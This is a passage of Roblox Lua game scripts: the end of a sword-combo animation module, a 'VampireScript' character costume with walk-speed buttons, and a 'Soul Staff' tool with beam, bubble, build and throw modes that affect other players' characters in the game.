LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(0.2,0.2-0.1*i,0.5-0.1*i) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
end 
end 
for i = 0,1,0.03 do 
wait() 
if walking == false and attack == false then 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.67+0.1-0.1*i,3.14,-1.57) * CFrame.new(0,0,-0.5) 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(-0.3,0.3-0.1+0.1*i,-0.3+0.1-0.1*i) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(0.2,0.2-0.1+0.1*i,0.5-0.1+0.1*i) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
end 
end 
end 
end 
GetWalk=function()--tell whenever the Humanoid is walking.
        if (Torso.Velocity-Vector3.new(0,Torso.Velocity.y,0)).magnitude>=1 then
                Walk = true 
                else 
                Walk = false 
        end
print(Walk) 
end
hold = false 
function ob1d(mouse) 
if attack == true then return end 
hold = true 
if walking == true and combo == 0 then 
attack = true 
Character.Humanoid.WalkSpeed = 0 
wait(0.1) 
walking = false 
fourslash() 
combo = 0 
Stance() 
wait(0.2) 
Character.Humanoid.WalkSpeed = 16 
Stance() 
elseif walking == false then 
if combo == 0 then 
oneslash() 
walking = false 
coroutine.resume(coroutine.create(function()
wait(0.5) 
if attack == false then 
combo = 0 
walking = false 
Stance() 
end 
end)) 
elseif combo == 1 then 
twoslash() 
walking = false 
coroutine.resume(coroutine.create(function()
wait(0.5) 
if attack == false then 
combo = 0 
walking = false 
Stance() 
end 
end)) 
elseif combo == 2 then 
threeslash() 
walking = false 
coroutine.resume(coroutine.create(function()
wait(0.6) 
gairo.Parent = nil 
if attack == false then 
combo = 0 
walking = false 
Stance() 
end 
end)) 
elseif combo == 3 then 
fourslash() 
walking = false 
coroutine.resume(coroutine.create(function()
wait(0.2) 
if attack == false then 
combo = 0 
walking = false 
Stance() 
end 
end)) 
end 
end 
end 
function ob1u(mouse) 
hold = false 
end 
buttonhold = false 
function key(key) 
if key == "w" or key == "a" or key == "s" or key == "d" then 
if key == "w" then 
holdingW = true 
elseif key == "a" then 
holdingA = true 
elseif key == "s" then 
holdingS = true 
elseif key == "d" then 
holdingD = true 
end 
walking = true 
gairo.Parent = nil 
Character.Humanoid.WalkSpeed = 16 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.57,3.14,0) * CFrame.new(0,0,-0.5) 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
for i = 0,1,0.1 do 
wait() 
if walking == true then 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(1*i,0,0) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(-1*i,0,0) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
end 
end 
wait(0.1) 
while walking == true do 
wait() 
for i = 0,1,0.1 do 
wait() 
if walking == true and attack == false then 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(1-2*i,0,0) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(-1+2*i,0,0) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
end 
end 
for i = 0,1,0.1 do 
wait() 
if walking == true and attack == false then 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(1-2+2*i,0,0) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(-1+2-2*i,0,0) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
end 
end 
end 
--Character.Humanoid.WalkSpeed = 16 
end 
if attack == true then return end 
if key == "z" then 
Onslaught() 
end 
if key == "x" then 
DestroyerOfHeaven() 
end 
end 
function key2(key) 
if attack == true then return end 
if key == "w" then 
holdingW = false 
elseif key == "a" then 
holdingA = false 
elseif key == "s" then 
holdingS = false 
elseif key == "d" then 
holdingD = false 
end 
if key == "w" or key == "a" or key == "s" or key == "d" then 
if walkdebounce == false then 
if holdingW == false and holdingA == false and holdingS == false and holdingD == false then 
coroutine.resume(coroutine.create(function() 
for i = 0,50 do 
wait(0) 
walkdebounce = true 
end 
walkdebounce = false 
end)) 
walking = false 
Character.Humanoid.WalkSpeed = 0 
gairo.Parent = Head
gairo.maxTorque = Vector3.new(4e+005,4e+005,4e+005)*math.huge 
gairo.P = 20e+003 
gairo.cframe = Head.CFrame 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(-0.3,0.3,-0.3) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(0.2,0.2,0.5) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
for i = 0,1,0.1 do 
wait() 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.57+0.1*i,3.14,-1.57*i) * CFrame.new(0,0,-0.5) 
end 
gairo.Parent = nil 
wait(0.1) 
while walking == false do 
for i = 0,1,0.03 do 
wait() 
if walking == false and attack == false then 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.67+0.1*i,3.14,-1.57) * CFrame.new(0,0,-0.5) 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(-0.3,0.3-0.1*i,-0.3+0.1*i) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(0.2,0.2-0.1*i,0.5-0.1*i) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
end 
end 
for i = 0,1,0.03 do 
wait() 
if walking == false and attack == false then 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.67+0.1-0.1*i,3.14,-1.57) * CFrame.new(0,0,-0.5) 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(-0.3,0.3-0.1+0.1*i,-0.3+0.1-0.1*i) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(0.2,0.2-0.1+0.1*i,0.5-0.1+0.1*i) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
end 
end 
end 
end 
end 
end 
end 
function s(mouse) 
mouse.Button1Down:connect(function() ob1d(mouse) end) 
mouse.Button1Up:connect(function() ob1u(mouse) end) 
mouse.KeyDown:connect(key) 
mouse.KeyUp:connect(key2) 
sheathed = false 
player = Player 
ch = Character 
RSH = ch.Torso["Right Shoulder"] 
LSH = ch.Torso["Left Shoulder"] 
RHP = ch.Torso["Right Hip"] 
LHP = ch.Torso["Left Hip"] 
-- 
RSH.Parent = nil 
LSH.Parent = nil 
--[[RHP.C0 = CFrame.new(-0.5, -1.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
RHP.C1 = CFrame.new(0, 0.5, 0) 
LHP.C0 = CFrame.new(0.5, -1.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,0) 
LHP.C1 = CFrame.new(0, 0.5, 0) ]]
-- 
RW.Part0 = ch.Torso 
RW.C0 = CFrame.new(1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.3, 0, -0.5) 
RW.C1 = CFrame.new(0, 0.5, 0) 
RW.Part1 = ch["Right Arm"] 
RW.Parent = ch.Torso 
--_G.R = RW 
-- 
LW.Part0 = ch.Torso 
LW.C0 = CFrame.new(-1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.7, 0, 0.8) 
LW.C1 = CFrame.new(0, 0.5, 0) 
LW.Part1 = ch["Left Arm"] 
LW.Parent = ch.Torso 

equipanim() 
end 
function ds(mouse) 
sheathed = true 
guardy = false 
walking = nil 
Character.Humanoid.WalkSpeed = 16 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.57,3.14,0) * CFrame.new(0,0,-0.5) 

gairo.Parent = nil 
hideanim() 
RW.Parent = nil 
LW.Parent = nil 
RSH.Parent = player.Character.Torso 
LSH.Parent = player.Character.Torso 
end 
Bin.Selected:connect(s) 
Bin.Deselected:connect(ds) 

end}
module[6] = {"VampireScript",function()

    																																																																																																																																																																																																																																																																																																																																												
																																																																																																																																																																																																																																																																																--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
pl = game.Players.LocalPlayer.Name
Player = Game:GetService("Players").LocalPlayer
char = Game:GetService("Players").LocalPlayer.Character
Character = Player.Character
RightArm = Character["Right Arm"]
RightShoulder = Character.Torso["Right Shoulder"] 
LeftArm = Character["Left Arm"]
Torso = Character["Torso"]
LeftLeg = Character["Left Leg"]
RightLeg = Character["Right Leg"]
Head = Character["Head"]
-------------------------------------
char.Head.face.Texture = "http://www.roblox.com/asset/?id=17058440"

function CheckI(Item,Blacklist,Specific)
        for _,v in pairs(Item:children()) do
                if not Specific then
                        if v:IsA(Blacklist) or v.Name:match(Blacklist) then
                                v:Destroy()
                        end
                else
                        if v:IsA(Blacklist) or v.Name == Blacklist then
                                v:Destroy()
                        end
                end
        end
end

CheckI(Character,"Hat")
-------------------------------------

Part13 = Instance.new("Part", Character)
Part13.TopSurface = 0
Part13.BottomSurface = 0
Part13.Transparency = 0
Part13.FormFactor = "Custom"
Part13.Size = Vector3.new(1, 1, 1)
Part13.BrickColor = BrickColor.new("Really black")
Part13.CanCollide = false
Weld13 = Instance.new("Weld", Part13)
Weld13.Part0 = Part13
Weld13.Part1 = Head
Weld13.C0 = CFrame.new(0, -0.8, 0)
SHMesh = Instance.new("SpecialMesh")
SHMesh.Parent = Part13
SHMesh.Scale = Vector3.new(1, 1, 1)
SHMesh.MeshId = "http://www.roblox.com/asset/?id=1028713"
SHMesh.TextureId = "http://www.roblox.com/asset/?id=15726328"

Part135 = Instance.new("Part", Character)
Part135.TopSurface = 0
Part135.BottomSurface = 0
Part135.Transparency = 1
Part135.Reflectance = 0.8
Part135.FormFactor = "Custom"
Part135.Size = Vector3.new(1, 1, 1)
Part135.BrickColor = BrickColor.new("White")
Part135.CanCollide = false
Weld13 = Instance.new("Weld", Part135)
Weld13.Part0 = Part135
Weld13.Part1 = Head
Weld13.C0 = CFrame.new(0, -3, 0)
SHMesh = Instance.new("SpecialMesh")
SHMesh.Parent = Part135
SHMesh.MeshType = "Sphere"
x = Instance.new("PointLight",Part135)
x.Range = 20
x.Enabled = false


Part = Instance.new("Part", Character)
Part.TopSurface = 0
Part.BottomSurface = 0
Part.Transparency = 0
Part.FormFactor = "Custom"
Part.Size = Vector3.new(1, 2, 1)
Part.BrickColor = BrickColor.new("Really black")
Part.CanCollide = false
char["Right Leg"].Transparency = 1
Weld = Instance.new("Weld", Part)
Weld.Part0 = Part
Weld.Part1 = RightLeg
Weld.C0 = CFrame.new(0, 0, 0)

Part2 = Instance.new("Part", Character)
Part2.TopSurface = 0
Part2.BottomSurface = 0
Part2.Transparency = 0
Part2.FormFactor = "Custom"
Part2.Size = Vector3.new(1, 2, 1)
Part2.BrickColor = BrickColor.new("Really black")
Part2.CanCollide = false
char["Left Leg"].Transparency = 1
Weld2 = Instance.new("Weld", Part2)
Weld2.Part0 = Part2
Weld2.Part1 = LeftLeg
Weld2.C0 = CFrame.new(0, 0, 0)

Part7 = Instance.new("Part", Character)
Part7.TopSurface = 0
Part7.BottomSurface = 0
Part7.Transparency = 0
Part7.FormFactor = "Custom"
Part7.Size = Vector3.new(1, 1.7, 1)
Part7.BrickColor = BrickColor.new("White")
Part7.CanCollide = false
char["Right Arm"].Transparency = 1
Weld7 = Instance.new("Weld", Part7)
Weld7.Part0 = Part7
Weld7.Part1 = RightArm
Weld7.C0 = CFrame.new(0, 0.2, 0)

Part45 = Instance.new("Part", Character)
Part45.TopSurface = 0
Part45.BottomSurface = 0
Part45.Transparency = 0
Part45.FormFactor = "Custom"
Part45.Size = Vector3.new(1.1, 1, 1.1)
Part45.BrickColor = BrickColor.new("Really black")
Part45.CanCollide = false
Weld3 = Instance.new("Weld", Part45)
Weld3.Part0 = Part45
Weld3.Part1 = RightArm
Weld3.C0 = CFrame.new(0, -0.5, 0)

Part8 = Instance.new("Part", Character)
Part8.TopSurface = 0
Part8.BottomSurface = 0
Part8.Transparency = 0
Part8.FormFactor = "Custom"
Part8.Size = Vector3.new(1, 1.7, 1)
Part8.BrickColor = BrickColor.new("White")
Part8.CanCollide = false
char["Left Arm"].Transparency = 1
Weld8 = Instance.new("Weld", Part8)
Weld8.Part0 = Part8
Weld8.Part1 = LeftArm
Weld8.C0 = CFrame.new(0, 0.2, 0)

Part45 = Instance.new("Part", Character)
Part45.TopSurface = 0
Part45.BottomSurface = 0
Part45.Transparency = 0
Part45.FormFactor = "Custom"
Part45.Size = Vector3.new(1.1, 1, 1.1)
Part45.BrickColor = BrickColor.new("Really black")
Part45.CanCollide = false
Weld3 = Instance.new("Weld", Part45)
Weld3.Part0 = Part45
Weld3.Part1 = LeftArm
Weld3.C0 = CFrame.new(0, -0.5, 0)

Part13 = Instance.new("Part", Character)
Part13.TopSurface = 0
Part13.BottomSurface = 0
Part13.Transparency = 0
Part13.FormFactor = "Custom"
Part13.Size = Vector3.new(2, 2, 1)
Part13.BrickColor = BrickColor.new("Really black")
Part13.CanCollide = false
char["Torso"].Transparency = 1
Weld13 = Instance.new("Weld", Part13)
Weld13.Part0 = Part13
Weld13.Part1 = Torso
Weld13.C0 = CFrame.new(0, 0, 0)

Part123 = Instance.new("Part", Character)
Part123.TopSurface = 0
Part123.BottomSurface = 0
Part123.Transparency = 0
Part123.FormFactor = "Custom"
Part123.Size = Vector3.new(1, 1, 1)
Part123.BrickColor = BrickColor.new("White")
Part123.CanCollide = false
Weld13 = Instance.new("Weld", Part123)
Weld13.Part0 = Part123
Weld13.Part1 = Torso
Weld13.C0 = CFrame.new(0, 0.5, -0.8)
SHMesh = Instance.new("SpecialMesh")
SHMesh.Parent = Part123
SHMesh.Scale = Vector3.new(1.5, 1.5, 1.5)
SHMesh.MeshId = "http://www.roblox.com/asset/?id=94820260"
SHMesh.TextureId = "http://www.roblox.com/asset/?id=94820166"

sg = Instance.new("ScreenGui")
sg.Parent = game.Players[pl].PlayerGui
button1 = Instance.new("TextButton")
button1.Parent = sg
button1.Text = "Light-On"
button1.Position = UDim2.new(0,0,0.1,0)
button1.Size = UDim2.new(0.1,0,0.1,0)
button1.MouseButton1Click:connect(function()
x.Enabled = true
Part135.Transparency = 0
end)
button2 = Instance.new("TextButton")
button2.Parent = sg
button2.Text = "Light-Off"
button2.Position = UDim2.new(0,0,0.2,0)
button2.Size = UDim2.new(0.1,0,0.1,0)
button2.MouseButton1Click:connect(function()
x.Enabled = false
Part135.Transparency = 1
end)
button3 = Instance.new("TextButton")
button3.Parent = sg
button3.Text = "Slow - 10"
button3.Position = UDim2.new(0,0,0.3,0)
button3.Size = UDim2.new(0.1,0,0.1,0)
button3.MouseButton1Click:connect(function()
char.Humanoid.WalkSpeed = char.Humanoid.WalkSpeed - 10
end)
button4 = Instance.new("TextButton")
button4.Parent = sg
button4.Text = "Fast + 10"
button4.Position = UDim2.new(0,0,0.4,0)
button4.Size = UDim2.new(0.1,0,0.1,0)
button4.MouseButton1Click:connect(function()
char.Humanoid.WalkSpeed = char.Humanoid.WalkSpeed + 10
end)

local h = Instance.new("HopperBin")
h.Name = "Magic"
local p = game.Players:findFirstChild(pl)
if (p==nil) then return end
h.Parent = p.Backpack

function fast1()
char.Humanoid.WalkSpeed = 100
end

function fast2()
char.Humanoid.WalkSpeed = 20
end



function onKey(key, mouse)
    if key then
        local key = key:lower()
        if (key=="q") then
            fast1()
        if (key=="e") then
            fast2()
			end
        end
    end
end
h.Selected:connect(function(mouse)
mouse.KeyDown:connect(function(key) onKey(key, mouse) end)
end)

--[[Soul Staff Made By malfact]]--
 
 
 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local player = game.Players.LocalPlayer
local character = player.Character

if (player.Backpack:FindFirstChild("Soul Staff") ~= nil) then
player.Backpack["Soul Staff"].Parent = nil
end
if (character:FindFirstChild("Soul_Staff") ~= nil) then
character.Soul_Staff.Parent = nil
end

local RightShoulder = character.Torso["Right Shoulder"]
local ShoulderWeld = nil
local StaffWeld = nil

local debounce = false
local debounce2 = false

local mode = "hurt"
local orbWeld = {}
local keys = {}

local thrown = false
local hold = false
local holdTime = 0

local tool = Instance.new("HopperBin", player.Backpack)
tool.Name = "Soul Staff"
tool.Parent = player.Backpack
local model = Instance.new("Model",character)
model.Name = "Soul_Staff"

function animateArm(boolean, c0, c1)
if (boolean) then
if (ShoulderWeld == nil) then
ShoulderWeld = weld(character["Torso"],character["Right Arm"],CFrame.new())
end
RightShoulder.Part0 = nil

ShoulderWeld.C0 = c0
ShoulderWeld.C1 = c1
else
RightShoulder.Part0 = character.Torso
if (ShoulderWeld ~= nil) then
ShoulderWeld.Parent = nil
end
ShoulderWeld = nil
end
end

function animateStaff(boolean, c0, c1)
if (boolean) then
StaffWeld.Part0 = character["Right Arm"]
StaffWeld.Part1 = model:FindFirstChild("Handle")
StaffWeld.C0 = c0
StaffWeld.C1 = c1
else
StaffWeld.Part0 = character["Torso"]
StaffWeld.Part1 = model:FindFirstChild("Handle")
StaffWeld.C0 = CFrame.new(0,0,0.5)
StaffWeld.C1 = CFrame.new()*CFrame.Angles(0, 0, math.pi/4)
end
end

function weld(p0, p1, cframe)
local w = Instance.new("ManualWeld", p0) 
w.Part0 = p0
w.Part1 = p1 
w.C0 = cframe
return w
end

function newPart(size, color, parent)
local part = Instance.new("Part")
part.Locked = true
part.FormFactor = 3
part.Size = size
part.BrickColor = color
part.BottomSurface = 0
part.TopSurface = 0
part.Anchored = false
part.CanCollide = false
part.Parent = parent
return part
end

function newCylMesh(parent)
local mesh = Instance.new("CylinderMesh", parent)
return parent
end

function newSphereMesh(parent)
local mesh = Instance.new("SpecialMesh",parent)
mesh.MeshType = 3
return parent
end

function newIdMesh(id, size, parent)
local mesh = Instance.new("SpecialMesh",parent)
mesh.MeshType = 5
mesh.Scale = size
mesh.MeshId = "http://www.roblox.com/Asset/?id="..id
return parent
end

function addSoul(count)
for i = 1, count do
local p = newSphereMesh(newPart(Vector3.new(0.2,0.2,0.2),BrickColor.new(0,0,0),model))
orbWeld[#orbWeld + 1] = weld(model:FindFirstChild("core"),p,CFrame.new(0,0,0))
end
end

function removeSoul(count)
for i = 1, count do
orbWeld[#orbWeld].Part1.Parent = nil
orbWeld[#orbWeld] = nil
end
end

function getRadius(num)
if (num < 16) then
return 1
else
return num/16
end
end

local handle = newCylMesh(newPart(Vector3.new(0.2,6,0.2),BrickColor.new(1,1,1),model))
handle.Name = "Handle"

weld(handle,newSphereMesh(newPart(Vector3.new(0.4,0.4,0.4),BrickColor.new(0,0,0),model)),CFrame.new(0,3,0))
weld(handle,newCylMesh(newPart(Vector3.new(0.25,0.25,0.25),BrickColor.new(0,0,0),model)),CFrame.new(0,2.75,0))
weld(handle,newIdMesh("3270017",Vector3.new(0.25,0.25,0.5),newPart(Vector3.new(0.2,0.2,0.2),BrickColor.new(1,1,1),model)),CFrame.new(0,2.85,0)*CFrame.Angles(math.pi/2,0,0))
weld(handle,newIdMesh("3270017",Vector3.new(0.22,0.22,0.5),newPart(Vector3.new(0.2,0.2,0.2),BrickColor.new(1,1,1),model)),CFrame.new(0,2.6,0)*CFrame.Angles(math.pi/2,0,0))
weld(handle,newSphereMesh(newPart(Vector3.new(0.4,0.4,0.4),BrickColor.new(0,0,0),model)),CFrame.new(0,-3,0))
weld(handle,newCylMesh(newPart(Vector3.new(0.25,0.25,0.25),BrickColor.new(0,0,0),model)),CFrame.new(0,-2.75,0))
weld(handle,newIdMesh("3270017",Vector3.new(0.25,0.25,0.5),newPart(Vector3.new(0.2,0.2,0.2),BrickColor.new(1,1,1),model)),CFrame.new(0,-2.85,0)*CFrame.Angles(math.pi/2,0,0))
weld(handle,newIdMesh("3270017",Vector3.new(0.22,0.22,0.5),newPart(Vector3.new(0.2,0.2,0.2),BrickColor.new(1,1,1),model)),CFrame.new(0,-2.6,0)*CFrame.Angles(math.pi/2,0,0))
weld(handle,newIdMesh("3270017",Vector3.new(0.25,0.25,0.5),newPart(Vector3.new(0.2,0.2,0.2),BrickColor.new(1,1,1),model)),CFrame.new(0,0.5,0)*CFrame.Angles(math.pi/2,0,0))
weld(handle,newIdMesh("3270017",Vector3.new(0.25,0.25,0.5),newPart(Vector3.new(0.2,0.2,0.2),BrickColor.new(1,1,1),model)),CFrame.new(0,-0.5,0)*CFrame.Angles(math.pi/2,0,0))
weld(handle,newIdMesh("3270017",Vector3.new(0.21,0.21,1),newPart(Vector3.new(0.2,0.2,0.2),BrickColor.new(0,0,0),model)),CFrame.new(0,-0.4,0)*CFrame.Angles(math.pi/2,0,0))
weld(handle,newIdMesh("3270017",Vector3.new(0.21,0.21,1),newPart(Vector3.new(0.2,0.2,0.2),BrickColor.new(0,0,0),model)),CFrame.new(0,-0.3,0)*CFrame.Angles(math.pi/2,0,0))
weld(handle,newIdMesh("3270017",Vector3.new(0.21,0.21,1),newPart(Vector3.new(0.2,0.2,0.2),BrickColor.new(0,0,0),model)),CFrame.new(0,-0.2,0)*CFrame.Angles(math.pi/2,0,0))
weld(handle,newIdMesh("3270017",Vector3.new(0.21,0.21,1),newPart(Vector3.new(0.2,0.2,0.2),BrickColor.new(0,0,0),model)),CFrame.new(0,-0.1,0)*CFrame.Angles(math.pi/2,0,0))
weld(handle,newIdMesh("3270017",Vector3.new(0.21,0.21,1),newPart(Vector3.new(0.2,0.2,0.2),BrickColor.new(0,0,0),model)),CFrame.new(0,0.0,0)*CFrame.Angles(math.pi/2,0,0))
weld(handle,newIdMesh("3270017",Vector3.new(0.21,0.21,1),newPart(Vector3.new(0.2,0.2,0.2),BrickColor.new(0,0,0),model)),CFrame.new(0,0.1,0)*CFrame.Angles(math.pi/2,0,0))
weld(handle,newIdMesh("3270017",Vector3.new(0.21,0.21,1),newPart(Vector3.new(0.2,0.2,0.2),BrickColor.new(0,0,0),model)),CFrame.new(0,0.2,0)*CFrame.Angles(math.pi/2,0,0))
weld(handle,newIdMesh("3270017",Vector3.new(0.21,0.21,1),newPart(Vector3.new(0.2,0.2,0.2),BrickColor.new(0,0,0),model)),CFrame.new(0,0.3,0)*CFrame.Angles(math.pi/2,0,0))
weld(handle,newIdMesh("3270017",Vector3.new(0.21,0.21,1),newPart(Vector3.new(0.2,0.2,0.2),BrickColor.new(0,0,0),model)),CFrame.new(0,0.4,0)*CFrame.Angles(math.pi/2,0,0))

local core = newPart(Vector3.new(0.2,0.2,0.2),BrickColor.new(0,0,0),model)
core.Name = "core"
core.Reflectance = 0.5
core.Transparency = 0.25
local coreWeld = weld(handle,newIdMesh("9756362",Vector3.new(0.5,0.5,0.5),core),CFrame.new(0,3.75,0))
Instance.new("PointLight",core)

addSoul(8)

StaffWeld = weld(character["Torso"],handle,CFrame.new())
animateArm(false, nil, nil)
animateStaff(false, nil, nil)

function damage(char)
if (char == nil) then return end
if (char:FindFirstChild("Humanoid") ~= nil) then
if (not char.Humanoid:isA("Humanoid")) then
char.Parent = nil
return
end
local humanoid = char.Humanoid
if (humanoid.Health > 0 and humanoid.Health - (#orbWeld+1) <= 0) then
--addSoul(1)
end
if (char:FindFirstChild("Bubble") ~= nil) then
coroutine.resume(coroutine.create(function()
if (humanoid ~= nil) then
humanoid.WalkSpeed = -16
end
wait(5)
if (humanoid ~= nil) then
humanoid.WalkSpeed = 16
end
end))
humanoid.PlatformStand = false
char.Bubble.Parent = nil
--addSoul(1)
end
humanoid.Health = humanoid.Health - (#orbWeld+1)
end
end

function damageDistance(char, distance)
if (char == nil) then return end
if (char:FindFirstChild("Torso") ~= nil) then
local torso = char.Torso
if ((core.Position - torso.Position).magnitude <= distance) then
damage(char)
end
end
end

function beam(start, position)
coroutine.resume(coroutine.create(function()
if (position == nil or start == nil) then return end
local distance = (start-position).magnitude
local p = newPart(Vector3.new(0.2,0.2,distance),BrickColor.new(0,0,0),model)
p.Name = "beam012"
p.Anchored = true
p.Transparency = 0.25
p.CFrame = CFrame.new((start + position)/2,start) 
for i = 0, 0.75, 0.1 do
p.Transparency = 0.25+i
wait(0.01)
end
p.Parent = nil
end))
end

tool.Selected:connect(function(mouse)
if (not throw) then
animateArm(true, CFrame.new(1.5,0.5,0), CFrame.new(0,0.5,0)*CFrame.Angles(-math.pi/2, 0, 0))
animateStaff(true, CFrame.new(0,-1,0)*CFrame.Angles(math.pi + math.pi/2,0,0), CFrame.new())
end

mouse.Button1Down:connect(function()
local hit = mouse.Hit
if (debounce) then
return
end
debounce = true
if (mode == "hurt") then
beam(core.Position, hit.p)
if (mouse.Target ~= nil) then
if (mouse.Target.Name == "box") then
mouse.Target.Parent = nil
else
damage(mouse.Target.Parent)
end
end
elseif (mode == "throw") then
animateArm(false, nil, nil)
StaffWeld.Part0 = nil
if (handle:FindFirstChild("BodyPosition") ~= nil) then
handle:FindFirstChild("BodyPosition").Parent = nil
end
if (handle:FindFirstChild("BodyGyro") ~= nil) then
handle:FindFirstChild("BodyGyro").Parent = nil
end
local bp = Instance.new("BodyPosition",handle)
bp.maxForce = Vector3.new(100000,100000,100000)
bp.position = handle.Position + Vector3.new(0,30,0)
local bg = Instance.new("BodyGyro",handle)
bg.cframe = CFrame.new(bp.position,hit.p)*CFrame.Angles(math.pi/2,0,0)
wait(1)
bp.position = hit.p + Vector3.new(0,2,0)
wait(0.3)
bg.cframe = CFrame.new(bp.position,hit.p)*CFrame.Angles(math.pi/2,0,0)
throw = true
elseif (mode == "build") then
beam(core.Position, hit.p)
local p = newPart(Vector3.new(4,4,4),BrickColor.new(0,0,0),Workspace)
p.Name = "box"
p.Anchored = true
p.CanCollide = true
p.Transparency = 0.5
p.CFrame = hit*CFrame.Angles(math.random(0,math.pi*2),math.random(0,math.pi*2),math.random(0,math.pi*2))
Instance.new("PointLight",p)
elseif (mode == "bubble") then
beam(core.Position, hit.p)
if (#orbWeld > 0) then
if (mouse.Target.Parent:FindFirstChild("Humanoid") ~= nil) then
local humanoid = mouse.Target.Parent.Humanoid
if (mouse.Target.Parent:FindFirstChild("Bubble") == nil) then
if (mouse.Target.Parent:FindFirstChild("Torso") ~= nil) then
local torso = mouse.Target.Parent.Torso
local part = newPart(Vector3.new(8,8,8),BrickColor.new(0,0,0),mouse.Target.Parent)
part.Name = "Bubble"
part.Anchored = false
part.CanCollide = true
part.Shape = 0
part.Transparency = 0.5
part.CFrame = torso.CFrame
Instance.new("PointLight",part)
weld(torso,part,CFrame.new())
humanoid.PlatformStand = true
-- removeSoul(1)
end
else
coroutine.resume(coroutine.create(function()
if (humanoid ~= nil) then
humanoid.WalkSpeed = -50
end
wait(5)
if (humanoid ~= nil) then
humanoid.WalkSpeed = 16
end
end))
humanoid.PlatformStand = false
mouse.Target.Parent.Bubble.Parent = nil
--addSoul(1)
end
end
end
elseif (mode == "beam") then
if (not hold and not throw) then
animateStaff(true, CFrame.new(0,-1,0)*CFrame.Angles(math.pi,0,0), CFrame.new())
hold = true
holdTime = 0
end
elseif (mode == "portal") then
handle.Anchored = true
local p = newCylMesh(newPart(Vector3.new(1,0.25,1),BrickColor.new(0,0,0),model))
p.Anchored = true
p.CFrame = CFrame.new(handle.Position) + Vector3.new(0,-2,0)
local c = p.CFrame
for i=1,15,0.5 do
p.Size = p.Size+Vector3.new(0.5,0,0.5)
